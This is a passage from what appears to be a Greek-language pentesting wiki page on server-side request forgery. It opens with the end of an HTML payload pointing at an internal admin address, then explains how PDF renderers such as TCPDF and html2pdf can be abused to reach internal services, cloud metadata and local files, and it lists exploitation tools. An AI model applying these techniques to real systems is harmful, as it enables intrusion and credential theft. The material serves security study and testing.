<link rel="stylesheet" type="text/css" href="http://10.0.0.5/admin" />
</body>
</html>
```
- Η TCPDF 6.10.0 εκτελεί πολλές προσπάθειες ανάκτησης για κάθε `<img>` πόρο, οπότε ένα μόνο payload μπορεί να δημιουργήσει πολλαπλά αιτήματα (χρήσιμο για timing-based port scans).
- Το html2pdf αντιγράφει τη συμπεριφορά του TCPDF για τα `<img>` και προσθέτει ανάκτηση CSS μέσα στο `Css::extractStyle()`, το οποίο απλώς καλεί `file_get_contents($href)` μετά από έναν επιφανειακό έλεγχο scheme. Κακοποιήστε το για να στοχεύσετε loopback services, RFC1918 ranges, ή cloud metadata endpoints.
- Συνδυάστε αυτό το SSRF primitive με τα [HTML-to-PDF path traversal tricks](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) για να leak τόσο εσωτερικές HTTP απαντήσεις όσο και τοπικά αρχεία που αποδίδονται στο PDF.

Οι διαχειριστές ασφάλειας πρέπει να αφαιρούν εξωτερικά URLs πριν το rendering ή να απομονώνουν τον renderer σε network sandbox· μέχρι τότε, θεωρήστε τους PDF generators ως blind SSRF proxies.

## Εκμετάλλευση SSRF σε cloud περιβάλλον

Αν βρείτε μια ευπάθεια SSRF σε μια μηχανή που τρέχει μέσα σε cloud περιβάλλον, μπορεί να καταφέρετε να αποκτήσετε ενδιαφέρουσες πληροφορίες για το cloud περιβάλλον και ακόμη credentials:


{{#ref}}
cloud-ssrf.md
{{#endref}}

## Πλατφόρμες ευάλωτες σε SSRF

Πολλές γνωστές πλατφόρμες περιέχουν ή περιείχαν ευπάθειες SSRF — ελέγξτε τες στο:


{{#ref}}
ssrf-vulnerable-platforms.md
{{#endref}}

## Εργαλεία

### [**SSRFMap**](https://github.com/swisskyrepo/SSRFmap)

Tool to detect and exploit SSRF vulnerabilities

### [Gopherus](https://github.com/tarunkant/Gopherus)

- [Blog post on Gopherus](https://spyclub.tech/2018/08/14/2018-08-14-blog-on-gopherus/)

This tool generates Gopher payloads for:

- MySQL
- PostgreSQL
- FastCGI
- Redis
- Zabbix
- Memcache

### [remote-method-guesser](https://github.com/qtc-de/remote-method-guesser)

- [Blog post on SSRF usage](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/)

_remote-method-guesser_ είναι ένας vulnerability scanner για _Java RMI_ που υποστηρίζει λειτουργίες επίθεσης για τις πιο κοινές ευπάθειες _Java RMI_. Οι περισσότερες διαθέσιμες λειτουργίες υποστηρίζουν την επιλογή `--ssrf`, για να δημιουργήσουν ένα SSRF payload για τη ζητούμενη λειτουργία. Μαζί με την επιλογή `--gopher`, μπορούν να παραχθούν έτοιμα προς χρήση gopher payloads άμεσα.

### [SSRF Proxy](https://github.com/bcoles/ssrf_proxy)

SSRF Proxy είναι ένας multi-threaded HTTP proxy server σχεδιασμένος για να τούνελάρει την HTTP κίνηση του client μέσω HTTP servers ευάλωτων σε Server-Side Request Forgery (SSRF).

### Για εξάσκηση


{{#ref}}
https://github.com/incredibleindishell/SSRF_Vulnerable_Lab
{{#endref}}

## Αναφορές

- [https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4](https://medium.com/@pravinponnusamy/ssrf-payloads-f09b2a86a8b4)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
- [https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/](https://www.invicti.com/blog/web-security/ssrf-vulnerabilities-caused-by-sni-proxy-misconfigurations/)
- [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
